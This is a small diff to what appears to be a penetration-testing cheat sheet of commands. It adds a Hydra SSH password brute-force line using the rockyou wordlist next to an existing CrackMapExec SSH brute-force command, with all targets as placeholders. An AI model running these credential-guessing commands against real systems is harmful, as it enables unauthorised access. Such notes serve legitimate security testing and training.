@@ -217,6 +217,9 @@ ssh {USER}@{IP ADDRESS} -i {PKEY.ssh}
 # Remote file copy
 scp {USER}@{IP ADDRESS}:{FILE.ext} .
 
+# Hydra brute force
+hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{IP ADDRESS}
+
 # Crackmap brute force
 crackmapexec ssh {IP ADDRESS} -u {USER.txt} -p {PASSWORD.txt}
 
